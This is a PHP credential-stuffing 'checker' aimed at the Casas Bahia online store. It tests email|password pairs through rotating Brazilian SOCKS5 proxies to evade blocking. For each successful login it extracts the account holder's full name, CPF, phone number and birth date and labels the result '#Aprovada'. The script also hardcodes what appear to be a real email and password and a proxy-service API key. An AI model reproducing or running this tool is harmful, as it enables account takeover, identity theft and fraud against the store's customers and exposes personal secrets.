<?php
session_start();
 if(!$_SESSION['user'] == "paladino" and !$_SESSION['pass'] == "paladino"){  
   echo "<script>location.href='../'</script>";
 }
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');



extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
$senha = $separar[1];



function checkProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.cpanel.net/showip.cgi");
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $result = curl_exec($ch);
    if ($result !== FALSE) {
        return true;
    } else {
        return false;
    }
    curl_close($ch);
}

function getProxy() {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?coutry=BR&api_key=5a1a1257-cf8a-4975-b2fb-f01f13a3d023&protocol=SOCKS5&BR');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ml.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ml.txt');
    $proxy = curl_exec($ch);
    $proxy = json_decode($proxy);

    return $proxy->ipPort;
}


function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}

$ch = curl_init();
$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}

curl_setopt($ch, CURLOPT_URL, "https://carrinho.casasbahia.com.br/Checkout?ReturnUrl=http://www.casasbahia.com.br");
curl_setopt($ch, CURLOPT_TIMEOUT, 20);
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/casasbahia.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/casasbahia.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$d2 = curl_exec($ch);
 $token = getStr($d2,'var token = "','"');

$post = '{"clienteLogin":{"Token":"'.$token.'","Operador":"","IdUnidadeNegocio":8,"PalavraCaptcha":"","Senha":"renato96475870","cadastro":"on","Email":"renatomeucorreio@gmail.com"},"mesclarCarrinho":true,"Token":"'.$token.'","IdUnidadeNegocio":8,"Operador":""}';

$headers = [
'Host: carrinho.casasbahia.com.br',
'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
'Accept: application/json, text/javascript, */*; q=0.01',
'Accept-Language: pt-PT,pt;q=0.8,en;q=0.5,en-US;q=0.3',
'Accept-Encoding: gzip, deflate',
'Content-Type: application/json; charset=utf-8',
'X-Requested-With: XMLHttpRequest',
'Referer: https://carrinho.casasbahia.com.br/Checkout?ReturnUrl=%2fSite%2fMeusPedidos.aspx',
'Content-Length:'.strlen($post),
'Connection: keep-alive',
'Pragma: no-cache',
'Cache-Control: no-cache',
];
$ch = curl_init();
$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}
curl_setopt($ch, CURLOPT_URL, "https://carrinho.casasbahia.com.br/Api/checkout/Cliente.svc/Cliente/Login");
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies/casasbahia.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies/casasbahia.txt');
curl_setopt($ch, CURLOPT_REFERER, 'https://acesso.uol.com.br/login.html?skin=ps');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 1);                 
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$d3 = curl_exec($ch);


$loadtime = time();
$data = date("d/m/Y H:i:s");

if($d3){

    if (stristr($d3,'"Erro":false') !== false) {
        $nome = getStr($d3,'"NomeCompleto":"','",');
        $cpf = getStr($d3,'"Cpf":"','",');
        $dia = getStr($d3,'"DataNascimentoDia":"','",');
        $mes = getStr($d3,'"DataNascimentoMes":"','",');
        $ano = getStr($d3,'"DataNascimentoAno":"','",');
        $cell = getStr($d3,'"Telefone1DDDPF":"','",');
        $estado = getStr($d3,'"Estado":"','",');


    echo '<span style="width:100% !important" class="label label-success">#Aprovada ✅ '.$email . ' | '.$senha.' Informaçoes |</br> Nome:'.$nome.' | Cpf:'.$cpf.' | Celular:'.$cell. '| Data de nascimento | Dia:'.$dia.'  |  Mes:'.$mes. ' | Ano:'.$ano.' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |</br> #SH4DOWD3V-SH3CK3R<br> </span> <br>';

     }else {


        echo '<span class="label label-danger">#Reprovada - Bloqueado ❌ '. $email .' | '. $senha .' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |  #SH4DOWD3V-SH3CK3R<br></span>';
    }
}
?>